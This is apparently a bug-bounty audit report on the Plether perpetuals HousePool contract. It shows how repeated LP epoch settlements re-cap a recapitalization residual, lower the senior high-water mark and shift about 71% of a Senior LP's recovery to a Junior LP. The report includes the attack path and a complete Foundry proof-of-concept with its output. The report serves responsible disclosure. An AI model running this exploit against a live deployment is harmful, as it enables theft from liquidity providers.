# \#98257 [SC-High] Phantom loss from recounting recapitalization residual lowers the senior high water mark that losses must never reduce

**Submitted on Nov 6th 2026 at 12:01:51 UTC by @maigadoh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98257
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary
The spec requires that `Losses do not reduce the Senior high-water mark` ([ACCOUNTING_SPEC.md#L337](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L337)) and that `Senior impairment must be restored before junior extracts surplus` ([SECURITY.md#L394](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L394)), a pending recapitalization being reserved from reconciliation only because it is `already represented in snapshot.distributable` ([HousePoolReconcilePlanLib.sol#L41-L42](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L41-L42)); but `HousePool._reconcile` re-caps an already-backed recapitalization residual against equity it credited to `seniorPrincipal` in an earlier reconcile, so each later `settleLpEpoch` while the residual is pending books a loss that never happened, wipes Senior, and the empty-waterfall bootstrap rewrites `seniorHighWaterMark` down to the shrinking residual, so after the owner recapitalizes the minimum `clearDegradedMode()` accepts, two refunded Junior settlements (the first at an unchanged 1.90 basket) cut the mark from 46,694.55 to 13,494.55 USDG and the Senior LP later redeems 13,360.85 instead of 46,231.92 USDG, a 71.1% loss the triggering Junior LP collects.

## Root Cause
Every reconcile caps the whole pending bucket by the whole terminal equity. It does not separate fresh cash from a residual left by an earlier reconcile whose backing equity is already `seniorPrincipal`, so that equity is reserved a second time and charged as a Senior loss, which empties the waterfall and re-bootstraps `seniorHighWaterMark` at the residual.

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834

```solidity
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
// vulnerable: an already-priced residual is capped again by equity that already belongs to Senior
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
// vulnerable: reserving the re-capped residual turns Senior's existing equity into a booked loss
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L118-L121

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
// vulnerable: after the phantom wipe the "full intent" is only the residual, so the high-water mark drops to it
```

## Attack Path
Preconditions:
- Release parameters from `DEPLOYMENT.md` (maintenance 0.1%, initial 0.2%, execution fee 0.04%, buffer 0.25%, `CAP_PRICE` 2.00, Senior limits 40M USDG / 80%).
- A terminal deficit `d` with degraded mode latched. In the PoC a 100,000 long opened at 1.00 closes at 0.50 (`DegradedModeEntered(202,305.45, 249,000)`) and a 166,000 short opened at 0.50 is in profit at 1.90, so `d = 30,094.55`. This is a market tail nobody can force (the basket moves 0.50 to 1.90). The protocol documents this sequential long-then-short path as the boundary of its `max(Long, Short)` liability envelope, one it `may enter degraded mode` after ([WHITEPAPER.md#L268-L290](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L268-L290)), and ships degraded mode, `recapitalizePool` and the runbook below to recover from it; this bug sits in that recovery path.
- The owner follows the terminal-deficit runbook ([SECURITY.md#L1499-L1510](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1499-L1510)): `CfdEngine.recapitalizePool(X)`, then `clearDegradedMode()` once `E >= L`. The PoC uses the minimum `X` that `clearDegradedMode()` accepts, 46,694.55 USDG computed from `engine.sides()`, `pool.totalAssets()` and `engine.totalTraderClaimBalanceAssets()`; one atom less reverts at `_availableCashForFreshPoolPayouts() < _maxLiability()` ([CfdEngine.sol#L662](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L662)). Because the first reconcile leaves Senior at `X - d = 16,600 < d`, the next reconcile re-reserves all of Senior's equity, so no price move is needed for the first wipe.
- No matured Senior redemption sits at the queue head during these settlements. Free assets are computed after the reconcile ([HousePool.sol#L835-L843](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L843)); while the residual stays reserved free assets are 0, so the Senior phase funds nothing and a Junior-only refund still records epoch progress.

1. A keeper calls `OrderRouter.settleLpEpoch` for a matured Junior request at 1.90. The first reconcile sets `seniorPrincipal = 16,600`, `seniorHighWaterMark = 46,694.55` and `pendingRecapitalizationAssets = 30,094.55`, the residual `d` reserved but unbacked.
2. A Junior LP calls `juniorVault.requestRedeem` for its whole balance. Junior principal is 0, so the next `settleLpEpoch` refunds the shares (accepted Cecuro MED-24 behaviour) and counts as progress ([HousePool.sol#L960-L987](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L960-L987)).
3. That settlement runs at the unchanged 1.90 basket. The reconcile caps the 30,094.55 residual by the 16,600 `distributable` it already credited to Senior, reserves it, charges a 16,600 loss that wipes Senior, and re-bootstraps Senior at 16,600 with `seniorHighWaterMark = 30,094.55`, leaving residual 13,494.55. No price moved.
4. A small adverse basket move to 1.92 and a third refunded redemption repeat the re-cap: the mark drops to 13,494.55, the residual to 214.55, `seniorPrincipal` to 13,280.
5. The basket returns to 1.00 and the short closes. Recovery restores Senior only to 13,494.55 and routes the rest to Junior: the Senior LP redeems 13,360.85 against 46,231.92 in a control on the identical 1.90 to 1.92 to 1.00 path with no settlement while the residual is pending.

This is not the intended residual behaviour. The project's own `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual` asserts `Residual recap should preserve senior's recovery target` and `Residual recap should settle once backing becomes available` ([HousePoolWaterfall.t.sol#L201-L217](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L201-L217)), and the SC-L1 fix response states that the unsettleable part `stays pending, stays reserved everywhere, and gets applied later once it's backed`. That test reconciles only once while the residual is pending; adding one more `vm.prank(address(seniorVault)); pool.reconcile();` before `_setTotalTraderClaim(0)` ([HousePoolWaterfall.t.sol#L213](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L213)) drops `seniorHighWaterMark` to 50,040 and it fails with `Residual recap should settle once backing becomes available: 50040000000 != 100000000000`. Only the first post-wipe recapitalization is meant to reset the mark (`Explicit recapitalization should reset the HWM`, [TrancheRecoveryBehavior.t.sol#L54](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L54)); every later reset here comes from a loss the pool never had. The SC-L1 cap is therefore an incomplete fix that introduces a new bug, which the program accepts for fixed findings, and no `SECURITY.md` Known Limitation covers it. No owner function restores a lowered mark: `assignUnassignedAssets` raises `seniorHighWaterMark` only together with newly minted shares ([HousePool.sol#L690-L697](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L690-L697)).

## Impact
The Senior LP loses 32,871.07 USDG of recovery the waterfall owes it, 71.1% of its 46,231.92 USDG exit, and the Junior LP who requests the redemptions gains 62,667.71 USDG; a control on the identical 1.90 to 1.92 to 1.00 basket path with no settlement while the residual is pending redeems the Senior LP in full (46,231.92 USDG), so the entire loss comes from the two extra permissionless settlements, not from the price move. The Junior LP pays only a redemption request and the settlement calls, so this is theft of unclaimed yield. Junior's gain exceeds Senior's loss because the ownerless recapitalization residual that the control leaves in `unassignedAssets` (30,094.55, against 214.55 in the attack) also reaches Junior, although recapitalization `never accrues to junior principal` ([HousePoolPendingPreviewLib.sol#L106-L107](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L106-L107)).

## Proof of Concept

## Proof of Concept
Add the PoC below to the existing `packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol`. That file extends the protocol's `AtomicLpEpochSettlementTestFixture` / `BasePerpTest` harness, which deploys the real `CfdEngine`, `HousePool`, both `TrancheVault`s, `PletherOracle` and the production `OrderRouter` through `LegacyOrderRouterHarness`, whose only addition is a scalar `commitOrder` adapter onto the production V3 commit. Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocks. The PoC applies the release risk parameters through `CfdEngineAdmin`'s 72-hour timelock and the release Senior limits through `proposePoolConfig`/`finalizePoolConfig`. Every trade is committed by the trader and executed by a keeper through `executeOrder`, and every LP settlement goes through `OrderRouter.settleLpEpoch`. `test_PoC_ResidualRecapWipesSeniorRecoveryTargetOnEveryFreshSettlement` recapitalizes the minimum `clearDegradedMode()` accepts and settles two refunded Junior redemptions while the residual is pending (the first at an unchanged 1.90 basket), against a control that follows the identical price path without those settlements. Then run:

```bash
cd packages/perps && forge test --match-path test/perps/spec/lp/AtomicLpEpochSettlement.t.sol --match-test test_PoC_ResidualRecapWipesSeniorRecoveryTargetOnEveryFreshSettlement -vvvv
```

```solidity
// packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol - add these imports:
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {console2} from "forge-std/console2.sol";

// and add these members and methods to contract AtomicLpEpochSettlementTest:
    address internal constant SENIOR_LP = address(0x5E1);
    address internal constant LONG_TRADER = address(0x1001);
    address internal constant SHORT_TRADER = address(0x1002);
    address internal constant KEEPER = address(0x1004);

    function _applyReleaseConfig() internal {
        ICfdEngineAdminHost.EngineRiskConfig memory risk;
        risk.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
        risk.executionFeeBps = 4;
        risk.frozenCloseSpreadBps = 50;
        risk.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(risk);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        pool.finalizePoolConfig();
    }

    function _refreshMark(
        uint256 price
    ) internal {
        vm.warp(vm.getBlockTimestamp() + 60);
        _setBasket(price, 0, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdateData());
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _refreshMark(price);
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        vm.warp(vm.getBlockTimestamp() + 6);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasket(price, 0, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.executeOrder(orderId, _emptyUpdateData());
        (uint256 size_,,,,,,) = engine.positions(account);
        assertEq(size_, isClose ? 0 : size, "order must execute");
    }

    function _routerSettle(
        uint256 epochId,
        uint256 price
    ) internal {
        _warpToEpoch(epochId);
        _setBasket(price, 0, vm.getBlockTimestamp());
        router.settleLpEpoch(_emptyUpdateData());
    }

    function _juniorRedeemSettlement(
        uint256 price
    ) internal {
        uint256 id = _requestJuniorRedeem(ALICE, juniorVault.balanceOf(ALICE));
        _routerSettle(id, price);
        vm.prank(ALICE);
        juniorVault.claimRedeemRefund(id, ALICE, ALICE);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
    }

    function _recoverAndExit() internal returns (uint256 seniorOut, uint256 juniorOut) {
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 166_000e18, 0, true, 100_000_000);
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 seniorId = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);
        uint256 juniorId = _requestJuniorRedeem(ALICE, juniorVault.balanceOf(ALICE));
        _routerSettle(juniorId, 100_000_000);
        uint256 seniorBefore = settlementToken.balanceOf(SENIOR_LP);
        uint256 juniorBefore = settlementToken.balanceOf(ALICE);
        vm.startPrank(SENIOR_LP);
        seniorVault.claimRedeem(seniorId, seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP), SENIOR_LP, SENIOR_LP);
        vm.stopPrank();
        vm.startPrank(ALICE);
        juniorVault.claimRedeem(juniorId, juniorVault.claimableRedeemRequest(juniorId, ALICE), ALICE, ALICE);
        vm.stopPrank();
        seniorOut = settlementToken.balanceOf(SENIOR_LP) - seniorBefore;
        juniorOut = settlementToken.balanceOf(ALICE) - juniorBefore;
    }

    function _enterTerminalDeficit() internal {
        _applyReleaseConfig();

        uint256 juniorId = _requestJuniorDeposit(ALICE, 150_000e6);
        _routerSettle(juniorId, 100_000_000);
        _claimJuniorDeposit(juniorId, ALICE);
        settlementToken.mint(SENIOR_LP, 100_000e6);
        vm.startPrank(SENIOR_LP);
        settlementToken.approve(address(seniorVault), 100_000e6);
        uint256 seniorId = seniorVault.requestDeposit(100_000e6, SENIOR_LP, SENIOR_LP);
        vm.stopPrank();
        _routerSettle(seniorId, 100_000_000);
        vm.prank(SENIOR_LP);
        seniorVault.claimDeposit(seniorId, 100_000e6, SENIOR_LP, SENIOR_LP);

        _fundTrader(LONG_TRADER, 20_000e6);
        _fundTrader(SHORT_TRADER, 20_000e6);
        _trade(LONG_TRADER, CfdTypes.Side.LONG, 100_000e18, 10_000e6, false, 100_000_000);
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 166_000e18, 10_000e6, false, 50_000_000);
        _trade(LONG_TRADER, CfdTypes.Side.LONG, 100_000e18, 0, true, 50_000_000);
        assertTrue(engine.degradedMode());

        _refreshMark(190_000_000);
    }

    function test_PoC_ResidualRecapWipesSeniorRecoveryTargetOnEveryFreshSettlement() public {
        _enterTerminalDeficit();

        // Owner follows the terminal-deficit runbook with the minimum recapitalization clearDegradedMode() accepts.
        (uint256 longMaxProfit,,,) = engine.sides(0);
        (uint256 shortMaxProfit,,,) = engine.sides(1);
        uint256 maxLiability = longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
        uint256 recap = maxLiability - (pool.totalAssets() - engine.totalTraderClaimBalanceAssets());
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap - 1);
        vm.expectRevert();
        engine.clearDegradedMode();
        engine.recapitalizePool(1);
        engine.clearDegradedMode();

        // First fresh settlement books the recapitalization as a reserved, unbacked residual d.
        vm.warp(juniorVault.lastDepositTime(ALICE) + juniorVault.DEPOSIT_COOLDOWN());
        _juniorRedeemSettlement(190_000_000);
        uint256 d = pool.pendingRecapitalizationAssets();
        console2.log("minimum clearing recap X / residual d", recap, d);
        console2.log("after settlement 1 @1.90: seniorPrincipal / HWM / residual",
            pool.seniorPrincipal(), pool.seniorHighWaterMark(), d);

        uint256 branch = vm.snapshotState();
        console2.log("control: basket 1.90 -> 1.92 -> 1.00, no settlement while residual pending");
        _refreshMark(192_000_000);
        (uint256 controlSenior, uint256 controlJunior) = _recoverAndExit();
        vm.revertToState(branch);

        console2.log("attack: two more fresh settlements while the residual is pending");
        _juniorRedeemSettlement(190_000_000);
        console2.log("after settlement 2 @1.90 (no price move): seniorPrincipal / HWM / residual",
            pool.seniorPrincipal(), pool.seniorHighWaterMark(), pool.pendingRecapitalizationAssets());
        _juniorRedeemSettlement(192_000_000);
        uint256 hwm = pool.seniorHighWaterMark();
        console2.log("after settlement 3 @1.92: seniorPrincipal / HWM / residual",
            pool.seniorPrincipal(), hwm, pool.pendingRecapitalizationAssets());
        (uint256 attackSenior, uint256 attackJunior) = _recoverAndExit();

        console2.log("Senior LP redeemed  control / attack", controlSenior, attackSenior);
        console2.log("Senior LP loss / Junior LP gain", controlSenior - attackSenior, attackJunior - controlJunior);
        assertLt(hwm, d);
        assertLt(attackSenior, controlSenior);
        assertGt(attackJunior, controlJunior);
    }
```

Reproduce on a clean machine (Foundry and the repo's git submodules, no other dependencies):

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# add the imports, members and methods above to packages/perps/test/perps/spec/lp/AtomicLpEpochSettlement.t.sol, then:
cd packages/perps && forge test --match-path test/perps/spec/lp/AtomicLpEpochSettlement.t.sol --match-test test_PoC_ResidualRecapWipesSeniorRecoveryTargetOnEveryFreshSettlement -vvvv
```

Output:

```bash
Ran 1 test for test/perps/spec/lp/AtomicLpEpochSettlement.t.sol:AtomicLpEpochSettlementTest
[PASS] test_PoC_ResidualRecapWipesSeniorRecoveryTargetOnEveryFreshSettlement() (gas: 16265797)
Logs:
  minimum clearing recap X / residual d 46694552957 30094552957
  after settlement 1 @1.90: seniorPrincipal / HWM / residual 16600000000 46694552957 30094552957
  control: basket 1.90 -> 1.92 -> 1.00, no settlement while residual pending
  attack: two more fresh settlements while the residual is pending
  after settlement 2 @1.90 (no price move): seniorPrincipal / HWM / residual 16600000000 30094552957 13494552957
  after settlement 3 @1.92: seniorPrincipal / HWM / residual 13280000000 13494552957 214552957
  Senior LP redeemed  control / attack 46231921307 13360854123
  Senior LP loss / Junior LP gain 32871067184 62667712770

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.54ms (21.66ms CPU time)
```

Expected vs. observed. The owner recapitalizes the minimum that clears degraded mode (46,694.55), leaving the residual `d = 30,094.55` reserved but already backed by `seniorPrincipal`. The first settlement sets the mark to 46,694.55. The second settlement, at the unchanged 1.90 basket, re-caps `d` against Senior's own 16,600 equity and drops the mark to 30,094.55 with no price move; the third, after a 1.92 mark, drops it again to 13,494.55. On recovery the Senior LP redeems 13,360.85 against the control's 46,231.92 on the identical price path, a 32,871.07 USDG (71.1%) loss collected by the Junior LP. The `-vvvv` trace shows the real path end to end: `OrderRouterHarness::settleLpEpoch -> HousePool::settleLpEpoch -> recordClaimantInflow` for each settlement, `CfdEngine::recapitalizePool` and `CfdEngine::clearDegradedMode` for the runbook, `TrancheVault::claimRedeemRefund` for each refunded Junior request, and only `MockSettlementToken` and `MockPyth` as test doubles.
